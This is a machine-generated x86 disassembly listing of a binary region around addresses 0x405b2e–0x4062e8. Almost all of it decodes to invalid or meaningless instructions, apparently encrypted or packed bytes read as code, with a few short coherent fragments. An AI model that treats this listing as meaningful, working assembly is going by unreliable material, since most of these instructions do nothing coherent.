  405b2e:	sub    eax,0xf3731554
  405b33:	dec    esp
  405b34:	pop    ds
  405b35:	sub    BYTE PTR [eax+0x6c9a5e08],ch
  405b3b:	cwde   
  405b3c:	push   eax
  405b3d:	sub    dl,BYTE PTR [eax]
  405b3f:	or     eax,0xb1ec9096
  405b44:	dec    esp
  405b45:	or     ch,BYTE PTR [esi+0x3873a9c1]
  405b4b:	pop    ds
  405b4c:	or     ebx,ebx
  405b4e:	pop    esp
  405b4f:	xchg   esp,eax
  405b50:	xchg   ecx,eax
  405b51:	stos   BYTE PTR es:[edi],al
  405b52:	arpl   WORD PTR [edi],si
  405b54:	rcr    edi,cl
  405b56:	shr    ecx,0x2e
  405b59:	and    al,0x8b
  405b5b:	nop
  405b5c:	jg     0x405b16
  405b5e:	xor    cl,BYTE PTR [esi-0x27]
  405b61:	hlt    
  405b62:	cmp    edi,DWORD PTR [edi+edi*2-0x78d77ddc]
  405b69:	retf   
  405b6a:	js     0x405b2f
  405b6c:	loop   0x405bdb
  405b6e:	pop    esi
  405b6f:	test   eax,0xe6b0083c
  405b74:	jl     0x405b71
  405b76:	jge    0x405bbb
  405b78:	or     bh,BYTE PTR [edi]
  405b7a:	jecxz  0x405b68
  405b7c:	mov    ch,0x40
  405b7e:	push   edi
  405b7f:	inc    esp
  405b80:	fcomip st,st(1)
  405b82:	xchg   edi,eax
  405b83:	dec    ebp
  405b84:	mov    fs,esi
  405b86:	mov    al,0x77
  405b88:	push   0x33ec458b
  405b8d:	mov    BYTE PTR [ebx],0xc7
  405b90:	push   eax
  405b91:	mov    eax,DWORD PTR [ebp-0x10]
  405b94:	add    eax,0xaa
  405b99:	push   eax
  405b9a:	jmp    0x405d92
  405b9f:	jne    0x405bbe
  405ba1:	adc    eax,0x71b155b1
  405ba6:	fld    DWORD PTR [edi+0x3f]
  405ba9:	mov    dh,0xdb
  405bab:	(bad)
  405baf:	pusha  
  405bb0:	sub    DWORD PTR [esi+0x7e],edi
  405bb3:	push   ebp
  405bb4:	jg     0x405c34
  405bb6:	jle    0x405bec
  405bb8:	mov    dl,0xe8
  405bba:	pop    ss
  405bbb:	and    eax,0xd4512b84
  405bc0:	addr16 xchg esi,eax
  405bc2:	lock pop esi
  405bc4:	mov    edi,0xe7e9f77a
  405bc9:	pop    edx
  405bca:	cmp    ebp,edx
  405bcc:	popa   
  405bcd:	push   eax
  405bce:	and    al,0x73
  405bd0:	push   ecx
  405bd1:	dec    edx
  405bd2:	in     eax,dx
  405bd3:	push   ebp
  405bd4:	int    0x23
  405bd6:	sub    bh,bl
  405bd8:	popf   
  405bd9:	jmp    0x405c08
  405bdb:	call   0x8ecf:0x64bfd188
  405be2:	jns    0x405b6d
  405be4:	lock lahf 
  405be6:	daa    
  405be7:	aam    0x2
  405be9:	sbb    eax,0x3913d249
  405bee:	sahf   
  405bef:	arpl   bp,bx
  405bf1:	fist   WORD PTR [esi-0x34b6195e]
  405bf7:	lock jno 0x405c74
  405bfa:	add    BYTE PTR [edi],bh
  405bfc:	out    0x1b,eax
  405bfe:	sti    
  405bff:	idiv   ecx
  405c01:	scas   eax,DWORD PTR es:[edi]
  405c02:	out    0x65,eax
  405c04:	int    0x2e
  405c06:	adc    ah,ch
  405c08:	dec    ecx
  405c09:	lds    ebp,FWORD PTR [edx+0x62a3406d]
  405c0f:	pushf  
  405c10:	vpsrad ymm4,ymm5,XMMWORD PTR [ebx+0x617cb61a]
  405c18:	scas   eax,DWORD PTR es:[edi]
  405c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c1a:	mov    esp,0x821b1c9e
  405c1f:	cmc    
  405c20:	mov    WORD PTR ds:0x2c24b535,?
  405c26:	mov    edi,0x14b13ea9
  405c2b:	and    DWORD PTR [esi],ecx
  405c2d:	cwde   
  405c2e:	mov    al,0xd5
  405c30:	inc    edi
  405c31:	or     eax,ebp
  405c33:	rol    BYTE PTR [ecx-0x5dbe3062],1
  405c39:	stos   DWORD PTR es:[edi],eax
  405c3a:	jno    0x405bcf
  405c3c:	icebp  
  405c3d:	les    esp,FWORD PTR [bx-0x4e]
  405c41:	rcr    BYTE PTR [edx],0x91
  405c44:	and    DWORD PTR ds:0x40e85c6d,ebp
  405c4a:	test   eax,0x575743b2
  405c4f:	mov    ds:0x32abe307,al
  405c54:	fst    st(2)
  405c56:	pop    ds
  405c57:	adc    ch,ah
  405c59:	repnz and edi,DWORD PTR [ecx]
  405c5c:	ins    DWORD PTR es:[edi],dx
  405c5d:	sbb    DWORD PTR [ebx+0x25],ebp
  405c60:	xor    al,BYTE PTR [eax-0x5ca38348]
  405c66:	or     edi,0x412988ee
  405c6c:	jae    0x405c8a
  405c6e:	mov    dl,0xd1
  405c70:	outs   dx,BYTE PTR ds:[esi]
  405c71:	jo     0x405ca1
  405c73:	jb     0x405c6c
  405c75:	or     ch,al
  405c77:	fcom   st(1)
  405c79:	sub    al,0x2b
  405c7b:	pop    esi
  405c7c:	add    al,0xfe
  405c7e:	imul   edx,edx,0xffffff9b
  405c81:	das    
  405c82:	stos   DWORD PTR es:[edi],eax
  405c83:	and    al,0x36
  405c85:	inc    edi
  405c86:	mov    edi,0x9aa0c76a
  405c8b:	add    esi,DWORD PTR [esi+ebp*2+0x51]
  405c8f:	test   al,0x2d
  405c91:	aaa    
  405c92:	inc    ecx
  405c93:	mov    ah,0xaa
  405c95:	cmp    dl,BYTE PTR [edx+edx*2-0x31d917a4]
  405c9c:	mov    ebx,0x2159a3f1
  405ca1:	(bad)  
  405ca2:	xchg   ebx,eax
  405ca3:	jl     0x405c25
  405ca5:	jns    0x405d0b
  405ca7:	aad    0x7
  405ca9:	cwde   
  405caa:	int    0x49
  405cac:	ret    
  405cad:	lods   eax,DWORD PTR ds:[esi]
  405cae:	ret    0xd78c
  405cb1:	adc    BYTE PTR [ebp+ebp*8+0x42],0x88
  405cb6:	test   eax,0x56bc1275
  405cbb:	(bad)  
  405cbd:	add    al,0xcd
  405cbf:	add    edi,DWORD PTR ds:0x5248e62c
  405cc5:	xor    DWORD PTR [ebx+0x1c],edi
  405cc8:	pop    ss
  405cc9:	pop    edi
  405cca:	mov    ecx,0xbc3bee7f
  405ccf:	or     DWORD PTR [edx+esi*4],eax
  405cd2:	out    0xf0,eax
  405cd4:	(bad)  
  405cd5:	dec    ebx
  405cd6:	shl    DWORD PTR [ecx+0x262c6388],0xeb
  405cdd:	(bad)  
  405cde:	bound  ecx,QWORD PTR [ebx]
  405ce0:	jae    0x405cf8
  405ce2:	lods   eax,DWORD PTR ds:[esi]
  405ce3:	and    BYTE PTR [esi],dh
  405ce5:	mov    DWORD PTR [edx+0x4a],edi
  405ce8:	inc    esi
  405ce9:	and    eax,0xd81cbd9a
  405cee:	mov    fs,WORD PTR [eax]
  405cf0:	call   0x4bc1:0x438c1e18
  405cf7:	mov    ch,0x4e
  405cf9:	test   esp,edi
  405cfb:	sbb    eax,DWORD PTR [edx-0x6e]
  405cfe:	or     eax,0x5c157d82
  405d03:	push   eax
  405d04:	jg     0x405d2b
  405d06:	pop    ds
  405d07:	pop    edx
  405d08:	add    bl,BYTE PTR ds:0xb9dcadfa
  405d0e:	(bad)  
  405d0f:	push   edx
  405d10:	or     al,0x16
  405d12:	ss inc eax
  405d14:	push   edi
  405d15:	fwait
  405d16:	(bad)  
  405d17:	(bad)  
  405d18:	pusha  
  405d19:	pop    eax
  405d1a:	sbb    ebp,DWORD PTR [edx]
  405d1c:	fst    DWORD PTR [ecx-0x24]
  405d1f:	cld    
  405d20:	mov    bl,0xc9
  405d22:	lock inc esi
  405d24:	lods   eax,DWORD PTR ds:[esi]
  405d25:	pop    eax
  405d26:	into   
  405d27:	and    al,ch
  405d29:	ret    0x493
  405d2c:	jns    0x405d29
  405d2e:	ror    DWORD PTR [esi],1
  405d30:	fadd   DWORD PTR [edx]
  405d32:	dec    ebx
  405d33:	test   eax,0xac27808
  405d38:	loope  0x405d46
  405d3a:	pushf  
  405d3b:	cmp    al,BYTE PTR [eax+edx*1+0x485ee69c]
  405d42:	xor    al,BYTE PTR [eax+0x4c896442]
  405d48:	pop    esi
  405d49:	jmp    0x2fcf:0xa01f2f72
  405d50:	add    DWORD PTR [esp+eax*8-0x4304b321],eax
  405d57:	xor    al,0xd6
  405d59:	repz scas eax,DWORD PTR es:[edi]
  405d5b:	ja     0x405d61
  405d5d:	inc    eax
  405d5e:	add    edi,DWORD PTR [ebp-0x36]
  405d61:	je     0x405d7b
  405d63:	mov    edi,ecx
  405d65:	pop    ebp
  405d66:	xor    eax,0x7f39710e
  405d6b:	pop    ebp
  405d6c:	pop    ds
  405d6d:	retf   
  405d6e:	mov    sp,0x8ec1
  405d72:	test   ecx,esp
  405d74:	push   ds
  405d75:	jmp    0x5713:0x50268d0d
  405d7c:	jo     0x405d02
  405d7e:	jnp    0x405d8a
  405d80:	sub    DWORD PTR [esi+0x3f2c792e],0x1b
  405d87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d88:	mov    ch,0xcf
  405d8a:	mov    ebx,0x5a2937e5
  405d8f:	xchg   ebp,eax
  405d91:	sub    DWORD PTR [ebx-0x7f740fbb],ecx
  405d97:	cwde   
  405d98:	add    DWORD PTR [eax],eax
  405d9a:	add    bh,bh
  405d9c:	xor    al,ch
  405d9e:	and    esi,DWORD PTR [eax+0x0]
  405da1:	add    BYTE PTR [ecx+0x7d83f845],cl
  405da7:	clc    
  405da8:	add    BYTE PTR [ebp-0xc16fbbb],cl
  405dae:	add    DWORD PTR [eax],eax
  405db0:	add    BYTE PTR [ebx+0x518ed1c9],dl
  405db6:	xchg   esi,eax
  405db7:	push   ecx
  405db8:	shl    DWORD PTR [edx-0x2063eca5],1
  405dbe:	or     DWORD PTR [ebx],edi
  405dc0:	nop
  405dc1:	inc    edi
  405dc2:	aaa    
  405dc3:	jle    0x405e43
  405dc5:	push   ebp
  405dc6:	jg     0x405e46
  405dc8:	jle    0x405e28
  405dca:	pop    eax
  405dcb:	xor    ebp,ecx
  405dcd:	inc    edx
  405dce:	add    ecx,esp
  405dd0:	retf   0x5b97
  405dd3:	popf   
  405dd4:	je     0x405df3
  405dd6:	cwde   
  405dd7:	call   0x9f2c:0x171afb6e
  405dde:	and    eax,0x481afdb5
  405de3:	and    esp,ebx
  405de5:	mov    ds:0xad57430a,al
  405dea:	scas   al,BYTE PTR es:[edi]
  405deb:	xchg   ebx,eax
  405dec:	int3   
  405ded:	test   eax,0xebf33aa4
  405df2:	je     0x405e64
  405df4:	dec    ecx
  405df5:	repnz out 0x25,al
  405df8:	mov    ds:0xbcd77997,eax
  405dfd:	je     0x405da7
  405dff:	pop    esp
  405e00:	or     DWORD PTR [esi],ebp
  405e02:	or     DWORD PTR [ebx],edx
  405e04:	sbb    BYTE PTR [ebp+0x286a58bf],al
  405e0a:	sub    eax,0x7c9930e5
  405e0f:	pop    edi
  405e10:	retf   
  405e11:	mov    es,esp
  405e13:	adc    al,0x64
  405e15:	mov    eax,0xf1419e44
  405e1a:	pop    eax
  405e1b:	ret    
  405e1c:	cmp    edx,DWORD PTR [esi-0x7d]
  405e1f:	inc    edx
  405e20:	das    
  405e21:	int    0x6a
  405e23:	or     al,0xb9
  405e25:	sub    BYTE PTR [ebp+0x64],bl
  405e28:	cmp    al,0xa6
  405e2a:	jmp    DWORD PTR [eax-0x37501900]
  405e30:	icebp  
  405e31:	test   al,0x54
  405e33:	fwait
  405e34:	push   cs
  405e35:	enter  0x6918,0xe8
  405e39:	pop    edi
  405e3a:	outs   dx,BYTE PTR ds:[esi]
  405e3b:	adc    eax,0xe5bc66af
  405e40:	xor    bl,BYTE PTR [esi-0x1a]
  405e43:	cli    
  405e44:	jbe    0x405e4a
  405e46:	popa   
  405e47:	jmp    0x3196f368
  405e4c:	xchg   ecx,eax
  405e4d:	ss pushf 
  405e4f:	xor    al,0x2f
  405e51:	std    
  405e52:	push   0x15770f7a
  405e57:	test   DWORD PTR [eax+eax*2],esp
  405e5a:	dec    DWORD PTR [ebx]
  405e5c:	cs xchg edi,eax
  405e5e:	iret   
  405e5f:	mov    bl,0x8f
  405e61:	cmp    dl,BYTE PTR [esi+0x2ebdd345]
  405e67:	lahf   
  405e68:	add    bl,BYTE PTR [ebx+0x6f]
  405e6b:	dec    ebx
  405e6c:	or     esp,0xf7ffc5dc
  405e72:	pop    esp
  405e73:	adc    BYTE PTR [eax+0x64c72066],ch
  405e79:	retf   0x1480
  405e7c:	xchg   ecx,eax
  405e7d:	pop    esi
  405e7e:	das    
  405e7f:	loopne 0x405e7a
  405e81:	mov    esi,0xbb02799d
  405e86:	push   ds
  405e87:	mov    ch,0x75
  405e89:	nop
  405e8a:	mov    edx,0x48208183
  405e8f:	jge    0x405e4a
  405e91:	push   cs
  405e92:	popf   
  405e93:	ds pop esp
  405e95:	sti    
  405e96:	mov    esi,DWORD PTR [ecx-0x70ac08b5]
  405e9c:	(bad)  
  405e9d:	pop    edx
  405e9e:	jnp    0x405e3d
  405ea0:	xor    BYTE PTR [edi],0xbe
  405ea3:	mov    ah,0xa2
  405ea5:	cld    
  405ea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ea7:	jno    0x405e52
  405ea9:	mov    ds:0xd4e0468f,eax
  405eae:	(bad)  
  405eaf:	mov    al,ds:0xa0573f64
  405eb4:	dec    edx
  405eb5:	scas   eax,DWORD PTR es:[edi]
  405eb6:	xlat   BYTE PTR ds:[ebx]
  405eb7:	mov    ds:0xdb085daa,eax
  405ebc:	jne    0x405ef6
  405ebe:	in     eax,dx
  405ebf:	and    edx,DWORD PTR [esi+0x4d83ce1f]
  405ec5:	jmp    0x405f03
  405ec7:	adc    dl,BYTE PTR [esi+0x6559a795]
  405ecd:	dec    esi
  405ece:	ret    
  405ecf:	xchg   esi,eax
  405ed0:	sbb    BYTE PTR [ebp-0x37456e6b],al
  405ed6:	jae    0x405ed8
  405ed8:	fidivr DWORD PTR [ebx+0x11453a17]
  405ede:	mov    BYTE PTR [esi],ch
  405ee0:	loope  0x405f0b
  405ee2:	jnp    0x405ea2
  405ee4:	loop   0x405f14
  405ee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ee7:	ds mov edx,0xaff3c858
  405eed:	mov    ds:0xac6b006,eax
  405ef2:	fist   DWORD PTR [ecx+0x65]
  405ef5:	cdq    
  405ef6:	pusha  
  405ef7:	or     edi,DWORD PTR [esi]
  405ef9:	ret    
  405efa:	or     BYTE PTR [eax+esi*1+0x70d2578b],0x1
  405f02:	fwait
  405f03:	and    BYTE PTR [ebp+0x13817771],bl
  405f09:	jmp    0xf9d5150
  405f0e:	sbb    eax,0x84185738
  405f13:	scas   al,BYTE PTR es:[edi]
  405f14:	fld    QWORD PTR [ebx-0x41be7395]
  405f1a:	pop    edx
  405f1b:	cwde   
  405f1c:	test   DWORD PTR [esp+ebx*4-0x68],ebx
  405f20:	xor    esi,DWORD PTR [edi]
  405f22:	mov    edi,0xf2e996e5
  405f27:	push   ebp
  405f28:	scas   al,BYTE PTR es:[edi]
  405f29:	sub    dh,ah
  405f2b:	pop    ebx
  405f2c:	loope  0x405f29
  405f2e:	sub    BYTE PTR [ebx+ebp*4+0x7e],dl
  405f32:	lds    edi,FWORD PTR [ebp-0x32]
  405f35:	retf   
  405f36:	inc    edx
  405f37:	(bad)  
  405f38:	cmp    eax,0x1e70c8c9
  405f3d:	xchg   ebp,eax
  405f3e:	in     al,0x12
  405f40:	jp     0x405f3f
  405f42:	inc    ecx
  405f43:	scas   eax,DWORD PTR es:[edi]
  405f44:	and    eax,0x43b2253b
  405f49:	mov    esi,0x45915a58
  405f4e:	jae    0x405fbc
  405f50:	mov    ebx,0x1076e5fa
  405f55:	mov    ds:0x7a3bcf5,al
  405f5a:	xor    eax,0xfcbb89c5
  405f5f:	fmul   DWORD PTR [ecx-0x23]
  405f62:	aad    0x6
  405f64:	jp     0x405f8a
  405f66:	and    al,0x92
  405f68:	mov    ds:0xdf18eb80,eax
  405f6d:	fidivr WORD PTR [ebx-0x52]
  405f70:	push   eax
  405f71:	das    
  405f72:	xchg   DWORD PTR [ebx-0xbfee0f8],eax
  405f78:	dec    esp
  405f79:	icebp  
  405f7a:	fdiv   st(5),st
  405f7c:	add    BYTE PTR [esi],al
  405f7e:	pop    esi
  405f7f:	cdq    
  405f80:	xor    al,0xc4
  405f82:	imul   esi,DWORD PTR [ebx-0x67e9ecd8],0xfffffff2
  405f89:	into   
  405f8a:	aam    0x16
  405f8c:	pop    ss
  405f8d:	cs pop ebp
  405f8f:	dec    eax
  405f90:	cmp    DWORD PTR [eax],0xfc8b751f
  405f96:	nop
  405f97:	cwde   
  405f98:	fdiv   st(1),st
  405f9a:	loop   0x405ffd
  405f9c:	gs inc ebx
  405f9e:	ret    0x471f
  405fa1:	repnz push ebp
  405fa3:	mov    cl,BYTE PTR [ecx-0x7bf01fbb]
  405fa9:	xchg   esi,eax
  405faa:	or     al,BYTE PTR [eax]
  405fac:	add    cl,ch
  405fae:	repz add DWORD PTR [eax],eax
  405fb1:	add    bl,ch
  405fb3:	hlt    
  405fb4:	pushf  
  405fb5:	dec    esi
  405fb6:	mov    eax,ds:0x9371e956
  405fbb:	inc    ebx
  405fbc:	and    dl,BYTE PTR [ecx-0x75]
  405fbf:	mov    eax,DWORD PTR [esi+0x7e359ad3]
  405fc5:	jle    0x40601c
  405fc7:	jg     0x406047
  405fc9:	jle    0x405f91
  405fcb:	sub    bh,BYTE PTR [esi+0x40]
  405fce:	js     0x405f5c
  405fd0:	pop    ebx
  405fd1:	shl    BYTE PTR [edx+eax*1+0x26],0xc1
  405fd6:	push   ebp
  405fd7:	sahf   
  405fd8:	icebp  
  405fd9:	aaa    
  405fda:	repz test DWORD PTR [esi],ebp
  405fdd:	test   BYTE PTR [ecx],ch
  405fdf:	fist   DWORD PTR [edx-0x59]
  405fe2:	cmp    DWORD PTR [eax],eax
  405fe4:	mov    DWORD PTR [esp+ebp*8+0x37],ebx
  405fe8:	enter  0xd52,0xa7
  405fec:	mov    eax,ds:0x57c37f1d
  405ff1:	xor    esp,esi
  405ff3:	in     al,dx
  405ff4:	inc    ecx
  405ff5:	mul    dh
  405ff7:	jno    0x405f85
  405ff9:	push   es
  405ffa:	mov    ch,0xb3
  405ffc:	dec    edx
  405ffd:	dec    ebp
  405ffe:	fild   DWORD PTR [edx+0x29a275ee]
  406004:	outs   dx,BYTE PTR ds:[esi]
  406005:	das    
  406006:	(bad)  
  406007:	(bad)  
  406008:	arpl   WORD PTR [edi+0x28987532],bp
  40600e:	enter  0xf10a,0x64
  406012:	mov    cl,0xbf
  406014:	xchg   esp,eax
  406015:	jp     0x405fd7
  406017:	rol    ecx,cl
  406019:	jnp    0x405feb
  40601b:	loopne 0x40607e
  40601d:	or     BYTE PTR [ecx-0x660380e4],0xb5
  406024:	js     0x40601f
  406026:	sub    al,BYTE PTR ds:0xbd2b6299
  40602c:	ret    0x3245
  40602f:	xchg   esi,eax
  406030:	out    0x84,al
  406032:	out    0x75,al
  406034:	lds    edx,FWORD PTR [ebp+0x52]
  406037:	fnstenv [esi+0x1]
  40603a:	mov    ds:0xe8d7167a,al
  40603f:	inc    eax
  406040:	mov    edi,0xefd01d02
  406045:	pop    ebx
  406046:	test   eax,0x71c7d11f
  40604b:	jns    0x406014
  40604d:	push   eax
  40604e:	sub    dh,bl
  406050:	imul   ecx,DWORD PTR [edx],0x44
  406053:	adc    cl,bl
  406055:	lods   al,BYTE PTR ds:[esi]
  406056:	aad    0x90
  406058:	repnz lahf 
  40605a:	cmc    
  40605b:	repnz dec eax
  40605d:	call   FWORD PTR [esp+ecx*4]
  406060:	inc    ecx
  406061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406062:	push   cs
  406063:	pop    esi
  406064:	cli    
  406065:	imul   edx,esp,0x2383eeda
  40606b:	inc    ebx
  40606c:	fucomi st,st(1)
  40606e:	xor    ecx,esi
  406070:	mov    al,ds:0xabfef61a
  406075:	pop    edx
  406076:	ss lock mov cl,0xf2
  40607a:	mov    edi,0x791e01be
  40607f:	sbb    BYTE PTR ss:[edi+edi*8-0x5d],0xe2
  406085:	pop    eax
  406086:	stc    
  406087:	or     BYTE PTR [eax+0x1b],bh
  40608a:	dec    eax
  40608b:	ins    DWORD PTR es:[edi],dx
  40608c:	in     eax,0xa3
  40608e:	mov    esp,0xacffb2e5
  406093:	mov    eax,edx
  406095:	dec    ecx
  406096:	xchg   esi,eax
  406097:	pop    ecx
  406098:	cli    
  406099:	aad    0x6f
  40609b:	addr16 (bad) 
  40609d:	bts    DWORD PTR [edx-0x36fd5712],esi
  4060a4:	mov    bl,0x59
  4060a6:	mov    ebp,DWORD PTR [ebp-0x71c69d71]
  4060ac:	sub    BYTE PTR [ecx-0x80],ch
  4060af:	scas   al,BYTE PTR es:[edi]
  4060b0:	enter  0x79d0,0xb7
  4060b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060b5:	xor    al,0xcb
  4060b7:	pushf  
  4060b8:	je     0x406088
  4060ba:	jnp    0x406096
  4060bc:	in     al,dx
  4060bd:	test   DWORD PTR [ebx],ebp
  4060bf:	popa   
  4060c0:	(bad)
  4060c4:	adc    eax,esi
  4060c6:	add    al,0x38
  4060c8:	scas   al,BYTE PTR es:[edi]
  4060c9:	mov    BYTE PTR [ecx],bl
  4060cb:	rol    BYTE PTR [ecx],0x15
  4060ce:	jns    0x406129
  4060d0:	push   ebp
  4060d1:	daa    
  4060d2:	or     DWORD PTR [esi],0xffffffc3
  4060d5:	dec    ebx
  4060d6:	(bad)  
  4060d7:	jns    0x40614e
  4060d9:	dec    edx
  4060da:	push   esp
  4060db:	pop    ds
  4060dc:	std    
  4060dd:	xchg   ebx,eax
  4060de:	add    bl,dh
  4060e0:	(bad)  
  4060e1:	stc    
  4060e2:	into   
  4060e3:	sbb    eax,0x34867b99
  4060e8:	dec    edx
  4060e9:	jnp    0x40615b
  4060eb:	fmul   QWORD PTR [edi]
  4060ed:	mov    al,ds:0x5d9c7151
  4060f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060f3:	fs jbe 0x4060f3
  4060f6:	lods   al,BYTE PTR ds:[esi]
  4060f7:	ds fwait
  4060f9:	pop    edi
  4060fa:	ss cmp esp,ecx
  4060fd:	inc    esi
  4060fe:	fcomp  QWORD PTR [ebp+0x64f823c5]
  406104:	dec    ebp
  406105:	jmp    DWORD PTR [esi+0x2cabb825]
  40610b:	and    eax,0xc3863164
  406110:	push   ebx
  406111:	xchg   esi,eax
  406112:	icebp  
  406113:	jb     0x4060e8
  406115:	jmp    0x4060d5
  406117:	mov    cs,WORD PTR [esi]
  406119:	jb     0x4060f2
  40611b:	icebp  
  40611c:	jg     0x4060a6
  40611e:	rcr    DWORD PTR [edx],1
  406120:	pop    ds
  406121:	pop    ds
  406122:	inc    ebp
  406123:	(bad)
  406126:	je     0x406148
  406128:	cwde   
  406129:	inc    edx
  40612a:	push   ds
  40612b:	xchg   ecx,eax
  40612c:	scas   eax,DWORD PTR es:[edi]
  40612d:	xchg   esi,eax
  40612e:	jb     0x406108
  406130:	call   0xf1f3:0x955d6708
  406137:	cld    
  406138:	adc    DWORD PTR [ebx-0x5d801bf8],0x5616ea08
  406142:	aaa    
  406143:	data16 fcmovu st,st(4)
  406146:	repnz shl BYTE PTR [ecx-0x578e2f1c],cl
  40614d:	inc    eax
  40614e:	xchg   esp,eax
  40614f:	adc    al,0x2e
  406151:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406152:	mov    dh,0x97
  406154:	ror    DWORD PTR [edi],0x5f
  406157:	adc    BYTE PTR [ecx+esi*8+0x4b2c5306],0x54
  40615f:	lahf   
  406160:	popa   
  406161:	jbe    0x406147
  406163:	cmp    DWORD PTR [ebp+edi*8-0x60],ecx
  406167:	pop    edx
  406168:	mov    BYTE PTR [esi],0x58
  40616b:	cmp    bx,WORD PTR [edi+0x6a]
  40616f:	mov    WORD PTR [edi],?
  406171:	lea    ebp,[ecx+0x57]
  406174:	rcr    DWORD PTR [ecx+0x4f],0xa4
  406178:	cmp    BYTE PTR [ecx-0x40467ef8],dl
  40617e:	repz es mov ch,dh
  406182:	sti    
  406183:	mov    ebp,DWORD PTR [edi+ebp*2-0x363aaa02]
  40618a:	sub    eax,0x5c8d84ed
  40618f:	jae    0x406149
  406191:	adc    eax,0x3f144be9
  406196:	add    eax,0x38ffdf90
  40619b:	adc    BYTE PTR [eax-0x3],dl
  40619e:	in     al,0x38
  4061a0:	je     0x4061bd
  4061a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061a3:	dec    esp
  4061a4:	pop    ebx
  4061a5:	lea    eax,[ebp-0x18]
  4061a8:	push   eax
  4061a9:	mov    eax,DWORD PTR [ebp-0x2c]
  4061ac:	xor    eax,esi
  4061ae:	add    eax,edi
  4061b0:	push   eax
  4061b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4061b4:	xor    eax,esi
  4061b6:	add    eax,edi
  4061b8:	push   eax
  4061b9:	push   DWORD PTR [ebp-0x8]
  4061bc:	lea    eax,[ebp-0x78]
  4061bf:	push   eax
  4061c0:	jmp    0x4063b8
  4061c5:	cmp    eax,0xb41aac57
  4061ca:	loope  0x406215
  4061cc:	jno    0x406181
  4061ce:	dec    edi
  4061cf:	add    dl,cl
  4061d1:	lea    ebx,[ecx]
  4061d3:	popf   
  4061d4:	(bad)  
  4061d5:	icebp  
  4061d6:	xor    edi,DWORD PTR [esi+0x7e]
  4061d9:	push   ebp
  4061da:	jg     0x40625a
  4061dc:	jle    0x406259
  4061de:	ficomp DWORD PTR [ebp+0x4a]
  4061e1:	inc    esp
  4061e2:	jbe    0x4061cd
  4061e4:	aaa    
  4061e5:	add    edi,DWORD PTR [edi-0x6dd0a653]
  4061eb:	xchg   esi,eax
  4061ec:	push   es
  4061ed:	(bad)  
  4061ee:	scas   eax,DWORD PTR es:[edi]
  4061ef:	xor    DWORD PTR [esi+0xc0db04a],edi
  4061f5:	mov    eax,ebx
  4061f7:	fmul   st,st(5)
  4061f9:	inc    esi
  4061fa:	nop
  4061fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061fc:	and    al,0xf6
  4061fe:	add    DWORD PTR [ecx],edi
  406200:	cmp    al,0x9b
  406202:	mov    esi,ebp
  406204:	shr    BYTE PTR [ecx-0xf],cl
  406207:	aam    0x50
  406209:	hlt    
  40620a:	xchg   esp,eax
  40620b:	dec    edi
  40620c:	loope  0x40624e
  40620e:	and    DWORD PTR [eax*1-0x7eab9712],edi
  406215:	mov    dl,0x80
  406217:	sub    al,0xeb
  406219:	dec    ebx
  40621a:	adc    ch,dl
  40621c:	daa    
  40621d:	fs xor esp,edi
  406220:	cmp    DWORD PTR [eax+ebx*2-0x3f],eax
  406224:	sub    ebx,DWORD PTR [ecx+ebx*2+0x1d7c4149]
  40622b:	dec    ecx
  40622c:	xor    BYTE PTR [eax+ebp*4],bh
  40622f:	mov    eax,0x5f24e798
  406234:	mov    ecx,0x875a9675
  406239:	loop   0x406254
  40623b:	or     ebp,esp
  40623d:	jmp    0x3e55c507
  406242:	dec    esp
  406243:	ins    BYTE PTR es:[edi],dx
  406244:	gs jmp 0xec61:0xf2781d4d
  40624c:	ja     0x406256
  40624e:	mov    bh,ch
  406250:	pop    ebx
  406251:	inc    ebp
  406252:	xor    eax,0x76f17143
  406257:	fxch   st(0)
  406259:	mov    ecx,0xf81ab96b
  40625e:	mov    DWORD PTR [ebx],0x8de75cc2
  406264:	jge    0x4062ba
  406266:	or     al,0xca
  406268:	sti    
  406269:	mov    esp,0xa9275398
  40626e:	and    DWORD PTR [edi+0x9],eax
  406271:	lock pop ecx
  406273:	cmp    BYTE PTR ss:[ecx],dh
  406276:	popf   
  406277:	inc    edx
  406278:	pop    ds
  406279:	rol    eax,cl
  40627b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40627c:	xchg   edx,eax
  40627d:	jb     0x40628c
  40627f:	mov    dh,0xfa
  406281:	push   esp
  406282:	jge    0x406287
  406284:	in     eax,dx
  406285:	push   ecx
  406286:	and    eax,0x4d646059
  40628b:	aad    0x49
  40628d:	sbb    eax,0xd17496ff
  406292:	sub    edi,DWORD PTR [edx-0x25e32c72]
  406298:	imul   ecx,DWORD PTR [ebx],0xffffff82
  40629b:	mov    al,0x42
  40629d:	and    BYTE PTR [ecx],cl
  40629f:	dec    ebp
  4062a0:	outs   dx,DWORD PTR ds:[esi]
  4062a1:	pop    edx
  4062a2:	cmp    BYTE PTR [eax],dh
  4062a4:	push   ds
  4062a5:	call   0x602e:0x99287915
  4062ac:	pop    ecx
  4062ad:	sbb    dh,cl
  4062af:	xchg   edi,eax
  4062b0:	push   edi
  4062b1:	pop    esi
  4062b2:	push   cs
  4062b3:	stos   BYTE PTR es:[edi],al
  4062b4:	mov    ?,ebx
  4062b6:	add    eax,0xb80d3ad9
  4062bb:	jl     0x4062da
  4062bd:	or     al,0x44
  4062bf:	or     esp,DWORD PTR [esi+0x46168646]
  4062c5:	pop    eax
  4062c6:	cmp    DWORD PTR [edx-0x3225ad9e],0xffffffd9
  4062cd:	test   ch,al
  4062cf:	and    al,0xf7
  4062d1:	jge    0x4062e0
  4062d3:	mov    dl,0xc2
  4062d5:	jecxz  0x4062c1
  4062d7:	jno    0x4062b6
  4062d9:	int3   
  4062da:	inc    ecx
  4062db:	mov    edx,0xc9e54a8a
  4062e0:	push   ebp
  4062e1:	pushf  
  4062e2:	adc    al,0x6c
  4062e4:	push   eax
  4062e5:	repz push eax
  4062e7:	xchg   esi,eax
  4062e8:	jmp    0x8a01b513
